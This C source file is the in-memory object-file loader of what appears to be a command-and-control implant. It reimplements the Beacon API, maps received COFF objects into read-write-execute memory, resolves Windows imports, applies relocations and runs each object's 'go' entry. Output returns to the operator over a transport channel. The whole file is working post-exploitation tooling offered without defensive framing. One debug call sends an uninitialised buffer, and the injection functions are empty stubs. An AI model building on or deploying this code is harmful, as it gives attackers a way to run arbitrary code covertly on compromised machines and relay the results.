#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdarg.h>

typedef struct transport_conn transport_conn_t;
typedef struct transport      transport_t;

typedef struct {
    uint8_t          *pe_bytes;
    uint64_t          pe_size;
    char              args[4096];
    transport_conn_t *conn;
    transport_t      *trans;
} ExecMemCtx;

#include "coff_loader.h"

extern int two_layer_send(transport_conn_t *conn, transport_t *trans,
                          const char *op, const void *buf, uint16_t len);

/* ================================================================
 *  COFF STRUCTURES
 * ================================================================ */

#pragma pack(push, 1)

typedef struct {
    uint16_t Machine;
    uint16_t NumberOfSections;
    uint32_t TimeDateStamp;
    uint32_t PointerToSymbolTable;
    uint32_t NumberOfSymbols;
    uint16_t SizeOfOptionalHeader;
    uint16_t Characteristics;
} CoffFileHeader;

typedef struct {
    char     Name[8];
    uint32_t VirtualSize;
    uint32_t VirtualAddress;
    uint32_t SizeOfRawData;
    uint32_t PointerToRawData;
    uint32_t PointerToRelocations;
    uint32_t PointerToLinenumbers;
    uint16_t NumberOfRelocations;
    uint16_t NumberOfLinenumbers;
    uint32_t Characteristics;
} CoffSection;

typedef struct {
    union {
        char ShortName[8];
        struct {
            uint32_t Zeros;
            uint32_t Offset;
        } Long;
    } Name;
    uint32_t Value;
    int16_t  SectionNumber;
    uint16_t Type;
    uint8_t  StorageClass;
    uint8_t  NumberOfAuxSymbols;
} CoffSymbol;

typedef struct {
    uint32_t VirtualAddress;
    uint32_t SymbolTableIndex;
    uint16_t Type;
} CoffReloc;

#pragma pack(pop)

#define COFF_MACHINE_AMD64  0x8664
#define COFF_MACHINE_I386   0x014C

#define IMAGE_SCN_CNT_UNINIT_DATA  0x00000080
#define IMAGE_SCN_MEM_EXECUTE      0x20000000

#define IMAGE_REL_AMD64_ADDR64     0x0001
#define IMAGE_REL_AMD64_ADDR32NB   0x0003
#define IMAGE_REL_AMD64_REL32      0x0004
#define IMAGE_REL_AMD64_REL32_1    0x0005
#define IMAGE_REL_AMD64_REL32_2    0x0006
#define IMAGE_REL_AMD64_REL32_3    0x0007
#define IMAGE_REL_AMD64_REL32_4    0x0008
#define IMAGE_REL_AMD64_REL32_5    0x0009

#define IMAGE_REL_I386_DIR32       0x0006
#define IMAGE_REL_I386_REL32       0x0014

#ifndef IMAGE_SYM_CLASS_EXTERNAL
#define IMAGE_SYM_CLASS_EXTERNAL   0x02
#endif
#ifndef IMAGE_SYM_CLASS_STATIC
#define IMAGE_SYM_CLASS_STATIC     0x03
#endif
#ifndef IMAGE_SYM_CLASS_LABEL
#define IMAGE_SYM_CLASS_LABEL      0x06
#endif

typedef struct {
    char *original;
    char *buffer;
    int   length;
    int   size;
} datap;

typedef struct {
    char *original;
    char *buffer;
    int   length;
    int   size;
} formatp;

#define CALLBACK_OUTPUT     0x00
#define CALLBACK_OUTPUT_OEM 0x1e
#define CALLBACK_ERROR      0x0d

/* ================================================================
 *  BEACON API - Global context for output
 * ================================================================ */

static transport_conn_t *g_bof_conn  = NULL;
static transport_t      *g_bof_trans = NULL;

/* ================================================================
 *  BEACON API - Implementation
 * ================================================================ */

void BeaconDataParse(datap *parser, char *buffer, int size)
{
    if (!parser) return;
    parser->original = buffer;
    parser->buffer   = buffer;
    parser->length   = size;
    parser->size     = size;
}

int BeaconDataInt(datap *parser)
{
    if (!parser || parser->length < 4) return 0;
    int val;
    memcpy(&val, parser->buffer, 4);
    parser->buffer += 4;
    parser->length -= 4;
    return val;
}

short BeaconDataShort(datap *parser)
{
    if (!parser || parser->length < 2) return 0;
    short val;
    memcpy(&val, parser->buffer, 2);
    parser->buffer += 2;
    parser->length -= 2;
    return val;
}

int BeaconDataLength(datap *parser)
{
    if (!parser) return 0;
    return parser->length;
}

char *BeaconDataExtract(datap *parser, int *size)
{
    if (!parser || parser->length < 4) {
        if (size) *size = 0;
        return NULL;
    }
    int len;
    memcpy(&len, parser->buffer, 4);
    parser->buffer += 4;
    parser->length -= 4;
    if (len < 0 || len > parser->length) len = parser->length;
    char *ptr = parser->buffer;
    parser->buffer += len;
    parser->length -= len;
    if (size) *size = len;
    return ptr;
}

void BeaconPrintf(int type, char *fmt, ...)
{
    char buf[8192];
    va_list ap;
    va_start(ap, fmt);
    int len = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (len > 0 && g_bof_conn && g_bof_trans) {
        if (len > 2000) len = 2000;  
        two_layer_send(g_bof_conn, g_bof_trans, "0x02", buf, (uint16_t)len);
    }
}

void BeaconOutput(int type, char *data, int len)
{
    /* Debug: log every call */
    char dbg[128];
    if (g_bof_conn && g_bof_trans)
        two_layer_send(g_bof_conn, g_bof_trans, "0x02", dbg, (uint16_t)strlen(dbg));

    if (len > 0 && data && g_bof_conn && g_bof_trans) {
        int offset = 0;
        while (offset < len) {
            int chunk = len - offset;
            if (chunk > 2000) chunk = 2000;
            two_layer_send(g_bof_conn, g_bof_trans, "0x02",
                           data + offset, (uint16_t)chunk);
            offset += chunk;
        }
    }
}


void BeaconFormatAlloc(formatp *format, int maxsz)
{
    if (!format) return;
    format->original = (char *)calloc(1, maxsz);
    format->buffer   = format->original;
    format->length   = 0;
    format->size     = maxsz;
}

void BeaconFormatReset(formatp *format)
{
    if (!format || !format->original) return;
    memset(format->original, 0, format->size);
    format->buffer = format->original;
    format->length = 0;
}

void BeaconFormatFree(formatp *format)
{
    if (!format) return;
    if (format->original) free(format->original);
    format->original = NULL;
    format->buffer   = NULL;
    format->length   = 0;
    format->size     = 0;
}

void BeaconFormatAppend(formatp *format, char *text, int len)
{
    if (!format || !format->original) return;
    if (format->length + len > format->size) return;
    memcpy(format->original + format->length, text, len);
    format->length += len;
}

void BeaconFormatPrintf(formatp *format, char *fmt, ...)
{
    if (!format || !format->original) return;
    int space = format->size - format->length;
    if (space <= 0) return;
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(format->original + format->length, space, fmt, ap);
    va_end(ap);
    if (n > 0 && n < space) format->length += n;
}

char *BeaconFormatToString(formatp *format, int *size)
{
    if (!format) { if (size) *size = 0; return NULL; }
    if (size) *size = format->length;
    return format->original;
}

void BeaconFormatInt(formatp *format, int value)
{
    BeaconFormatAppend(format, (char *)&value, 4);
}


BOOL BeaconIsAdmin(void)
{
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    PSID adminGroup = NULL;
    if (AllocateAndInitializeSid(&ntAuth, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

BOOL BeaconUseToken(HANDLE token)   { (void)token; return TRUE; }
void BeaconRevertToken(void)        { /* stub */ }

void BeaconGetSpawnTo(BOOL x86, char *buffer, int length)
{
    if (x86)
        strncpy(buffer, "C:\\Windows\\SysWOW64\\rundll32.exe", length);
    else
        strncpy(buffer, "C:\\Windows\\System32\\rundll32.exe", length);
}

void BeaconInjectProcess(HANDLE hProc, int pid, char *payload, int pLen,
                          int offset, char *arg, int aLen)
{ (void)hProc;(void)pid;(void)payload;(void)pLen;(void)offset;(void)arg;(void)aLen; }

void BeaconInjectTemporaryProcess(void *pInfo, char *payload, int pLen,
                                   int offset, char *arg, int aLen)
{ (void)pInfo;(void)payload;(void)pLen;(void)offset;(void)arg;(void)aLen; }

void BeaconCleanupProcess(void *pInfo) { (void)pInfo; }

char *BeaconGetOutputData(int *outsize)
{ if (outsize) *outsize = 0; return NULL; }

/* ================================================================
 *  BEACON API - Lookup table
 * ================================================================ */

typedef struct { const char *name; void *func; } BeaconApiEntry;

static const BeaconApiEntry g_beacon_api[] = {
    { "BeaconDataParse",              (void *)BeaconDataParse         },
    { "BeaconDataInt",                (void *)BeaconDataInt           },
    { "BeaconDataShort",              (void *)BeaconDataShort         },
    { "BeaconDataLength",             (void *)BeaconDataLength        },
    { "BeaconDataExtract",            (void *)BeaconDataExtract       },
    { "BeaconPrintf",                 (void *)BeaconPrintf            },
    { "BeaconOutput",                 (void *)BeaconOutput            },
    { "BeaconFormatAlloc",            (void *)BeaconFormatAlloc       },
    { "BeaconFormatReset",            (void *)BeaconFormatReset       },
    { "BeaconFormatFree",             (void *)BeaconFormatFree        },
    { "BeaconFormatAppend",           (void *)BeaconFormatAppend      },
    { "BeaconFormatPrintf",           (void *)BeaconFormatPrintf      },
    { "BeaconFormatToString",         (void *)BeaconFormatToString    },
    { "BeaconFormatInt",              (void *)BeaconFormatInt         },
    { "BeaconIsAdmin",                (void *)BeaconIsAdmin           },
    { "BeaconUseToken",               (void *)BeaconUseToken          },
    { "BeaconRevertToken",            (void *)BeaconRevertToken       },
    { "BeaconGetSpawnTo",             (void *)BeaconGetSpawnTo        },
    { "BeaconInjectProcess",          (void *)BeaconInjectProcess     },
    { "BeaconInjectTemporaryProcess", (void *)BeaconInjectTemporaryProcess },
    { "BeaconCleanupProcess",         (void *)BeaconCleanupProcess    },
    { "BeaconGetOutputData",          (void *)BeaconGetOutputData     },
    { NULL, NULL }
};

static void *find_beacon_api(const char *name)
{
    for (int i = 0; g_beacon_api[i].name; i++)
        if (strcmp(name, g_beacon_api[i].name) == 0)
            return g_beacon_api[i].func;
    return NULL;
}

/* ================================================================
 *  SYMBOL RESOLUTION
 * ================================================================ */

static void *resolve_import(const char *rawName)
{
    const char *sym = rawName;

    if (strncmp(sym, "__imp_", 6) == 0)
        sym += 6;


    void *api = find_beacon_api(sym);
    if (api) return api;


    const char *dollar = strchr(sym, '$');
    if (!dollar) return NULL;

    size_t libLen = (size_t)(dollar - sym);
    if (libLen == 0 || libLen >= 256) return NULL;

    char libName[256];
    memcpy(libName, sym, libLen);
    libName[libLen] = '\0';

    const char *funcName = dollar + 1;

    HMODULE hLib = GetModuleHandleA(libName);
    if (!hLib) hLib = LoadLibraryA(libName);
    if (!hLib) {
        char withDll[260];
        _snprintf(withDll, sizeof(withDll), "%s.dll", libName);
        hLib = LoadLibraryA(withDll);
    }
    if (!hLib) return NULL;

    return (void *)GetProcAddress(hLib, funcName);
}

/* ================================================================
 *  COFF DETECTION
 * ================================================================ */

int is_coff_bof(const uint8_t *data, uint64_t size)
{
    if (!data || size < sizeof(CoffFileHeader))
        return 0;
    if (data[0] == 'M' && data[1] == 'Z')
        return 0;
    uint16_t machine = *(const uint16_t *)data;
    return (machine == COFF_MACHINE_AMD64 || machine == COFF_MACHINE_I386);
}

/* ================================================================
 *  HELPER: get null-terminated symbol name
 * ================================================================ */

static const char *sym_name(CoffSymbol *sym, const char *strTab,
                            char *buf, int bufSz)
{
    if (sym->Name.Long.Zeros == 0) {
        return strTab + sym->Name.Long.Offset;
    }
    int len = 0;
    while (len < 8 && sym->Name.ShortName[len]) len++;
    if (len >= bufSz) len = bufSz - 1;
    memcpy(buf, sym->Name.ShortName, len);
    buf[len] = '\0';
    return buf;
}

/* ================================================================
 *  COFF LOADER - Main entry
 * ================================================================ */

void exec_bof_in_process(ExecMemCtx *ctx)
{
    transport_conn_t *conn  = ctx->conn;
    transport_t      *trans = ctx->trans;
    uint8_t  *raw  = ctx->pe_bytes;
    uint64_t  rawSz = ctx->pe_size;
    int       argsLen = (int)strlen(ctx->args);

    g_bof_conn  = conn;
    g_bof_trans = trans;

    #define BOF_MSG(fmt, ...) do {                             \
        char _m[512];                                          \
        int _n = _snprintf(_m, sizeof(_m), fmt, ##__VA_ARGS__);\
        if (_n > 0)                                            \
            two_layer_send(conn, trans, "0x02", _m, (uint16_t)_n); \
    } while(0)

    BOF_MSG("[BOF] Loading COFF object (%llu bytes)\n",
            (unsigned long long)rawSz);


    if (rawSz < sizeof(CoffFileHeader)) {
        BOF_MSG("[BOF] ERROR: file too small\n");
        goto done;
    }

    CoffFileHeader *hdr = (CoffFileHeader *)raw;

    if (hdr->Machine != COFF_MACHINE_AMD64 &&
        hdr->Machine != COFF_MACHINE_I386) {
        BOF_MSG("[BOF] ERROR: unsupported machine 0x%04X\n", hdr->Machine);
        goto done;
    }

    BOF_MSG("[BOF] Machine 0x%04X | %d sections | %d symbols\n",
            hdr->Machine, hdr->NumberOfSections, hdr->NumberOfSymbols);

    CoffSection *sections = (CoffSection *)(raw + sizeof(CoffFileHeader));
    CoffSymbol  *symbols  = (CoffSymbol  *)(raw + hdr->PointerToSymbolTable);
    const char  *strTab   = (const char  *)(symbols + hdr->NumberOfSymbols);


    #define ALIGN4K(x) (((x) + 0xFFFu) & ~0xFFFu)

    uint32_t totalSize = 0;
    uint32_t *secOffsets = (uint32_t *)calloc(hdr->NumberOfSections,
                                              sizeof(uint32_t));
    if (!secOffsets) { BOF_MSG("[BOF] ERROR: alloc\n"); goto done; }

    for (int i = 0; i < hdr->NumberOfSections; i++) {
        secOffsets[i] = totalSize;
        uint32_t sz = sections[i].SizeOfRawData;
        if (sections[i].Characteristics & IMAGE_SCN_CNT_UNINIT_DATA) {
            if (sections[i].VirtualSize > sz)
                sz = sections[i].VirtualSize;
        }
        if (sz < 256) sz = 256;        
        totalSize += ALIGN4K(sz);
    }

    uint32_t impOffset = totalSize;
    totalSize += hdr->NumberOfSymbols * sizeof(void *);
    totalSize  = ALIGN4K(totalSize);


    uint8_t *mem = (uint8_t *)VirtualAlloc(
        NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) {
        BOF_MSG("[BOF] ERROR: VirtualAlloc %u bytes failed\n", totalSize);
        free(secOffsets);
        goto done;
    }

    uint8_t **secBase = (uint8_t **)calloc(hdr->NumberOfSections,
                                            sizeof(uint8_t *));
    if (!secBase) {
        VirtualFree(mem, 0, MEM_RELEASE);
        free(secOffsets);
        BOF_MSG("[BOF] ERROR: alloc\n");
        goto done;
    }

    for (int i = 0; i < hdr->NumberOfSections; i++) {
        secBase[i] = mem + secOffsets[i];
        if (sections[i].SizeOfRawData > 0 && sections[i].PointerToRawData > 0)
            memcpy(secBase[i],
                   raw + sections[i].PointerToRawData,
                   sections[i].SizeOfRawData);
    }

    void **impStore = (void **)(mem + impOffset);

    void **funcPtrTable = (void **)calloc(hdr->NumberOfSymbols,
                                           sizeof(void *));
    if (!funcPtrTable) {
        VirtualFree(mem, 0, MEM_RELEASE);
        free(secBase); free(secOffsets);
        BOF_MSG("[BOF] ERROR: alloc\n");
        goto done;
    }

    char nameBuf[16]; 

    for (uint32_t i = 0; i < hdr->NumberOfSymbols; i++) {
        CoffSymbol *s = &symbols[i];
        const char *name = sym_name(s, strTab, nameBuf, sizeof(nameBuf));

        if (s->StorageClass == IMAGE_SYM_CLASS_EXTERNAL &&
            s->SectionNumber == 0 && s->Value == 0) {
            int isImp = (strncmp(name, "__imp_", 6) == 0);
            void *addr = resolve_import(name);

            if (!addr) {
                BOF_MSG("[BOF] WARN: unresolved: %s\n", name);
            } else {
                BOF_MSG("[BOF] resolved: %s -> %p (imp=%d)\n", name, addr, isImp);
            }

            if (isImp) {
                impStore[i] = addr;
                funcPtrTable[i] = &impStore[i];
            } else {
                funcPtrTable[i] = addr;
            }
        } else if (s->SectionNumber > 0) {
            int idx = s->SectionNumber - 1;
            if (idx < hdr->NumberOfSections)
                funcPtrTable[i] = secBase[idx] + s->Value;
        }

        i += s->NumberOfAuxSymbols;
    }


    for (int i = 0; i < hdr->NumberOfSections; i++) {
        CoffSection *sec = &sections[i];
        if (sec->NumberOfRelocations == 0) continue;

        CoffReloc *relocs = (CoffReloc *)(raw + sec->PointerToRelocations);

        for (int r = 0; r < sec->NumberOfRelocations; r++) {
            CoffReloc *rel  = &relocs[r];
            uint32_t   sIdx = rel->SymbolTableIndex;
            void      *symAddr = funcPtrTable[sIdx];

            if (!symAddr) continue; 

            uint8_t *patch = secBase[i] + rel->VirtualAddress;

            if (hdr->Machine == COFF_MACHINE_AMD64) {
                switch (rel->Type) {

                case IMAGE_REL_AMD64_REL32:
                case IMAGE_REL_AMD64_REL32_1:
                case IMAGE_REL_AMD64_REL32_2:
                case IMAGE_REL_AMD64_REL32_3:
                case IMAGE_REL_AMD64_REL32_4:
                case IMAGE_REL_AMD64_REL32_5:
                {
                    int addend = 0;
                    if (rel->Type > IMAGE_REL_AMD64_REL32)
                        addend = rel->Type - IMAGE_REL_AMD64_REL32;
                    int64_t delta = (int64_t)(uintptr_t)symAddr
                                  - (int64_t)(uintptr_t)(patch + 4 + addend);
                    *(int32_t *)patch += (int32_t)delta;
                    break;
                }

                case IMAGE_REL_AMD64_ADDR64:
                    *(uint64_t *)patch += (uint64_t)(uintptr_t)symAddr;
                    break;

                case IMAGE_REL_AMD64_ADDR32NB:
                    *(int32_t *)patch += (int32_t)((uint8_t *)symAddr - mem);
                    break;

                default:
                    BOF_MSG("[BOF] WARN: unknown AMD64 reloc type 0x%04X\n",
                            rel->Type);
                    break;
                }

            } else {  
                switch (rel->Type) {

                case IMAGE_REL_I386_DIR32:
                    *(uint32_t *)patch += (uint32_t)(uintptr_t)symAddr;
                    break;

                case IMAGE_REL_I386_REL32:
                    *(int32_t *)patch += (int32_t)(
                        (uint8_t *)symAddr - (patch + 4));
                    break;

                default:
                    BOF_MSG("[BOF] WARN: unknown I386 reloc type 0x%04X\n",
                            rel->Type);
                    break;
                }
            }
        }
    }


    void *goFunc = NULL;

    for (uint32_t i = 0; i < hdr->NumberOfSymbols; i++) {
        CoffSymbol *s = &symbols[i];
        if (s->SectionNumber > 0) {
            const char *name = sym_name(s, strTab, nameBuf, sizeof(nameBuf));
            if (strcmp(name, "go") == 0 || strcmp(name, "_go") == 0) {
                int idx = s->SectionNumber - 1;
                if (idx < hdr->NumberOfSections)
                    goFunc = secBase[idx] + s->Value;
                break;
            }
        }
        i += s->NumberOfAuxSymbols;
    }

    if (!goFunc) {
        BOF_MSG("[BOF] ERROR: entry point 'go' not found\n");
        goto cleanup;
    }


    BOF_MSG("[BOF] Executing entry at %p\n", goFunc);

    typedef void (*bof_entry_t)(char *, int);
    ((bof_entry_t)goFunc)(ctx->args, argsLen);

    BOF_MSG("[BOF] Execution complete\n");

cleanup:
    free(funcPtrTable);
    free(secBase);
    free(secOffsets);
    VirtualFree(mem, 0, MEM_RELEASE);

done:
    g_bof_conn  = NULL;
    g_bof_trans = NULL;

    two_layer_send(conn, trans, "0x02", NULL, 0);

    #undef BOF_MSG
    #undef ALIGN4K
}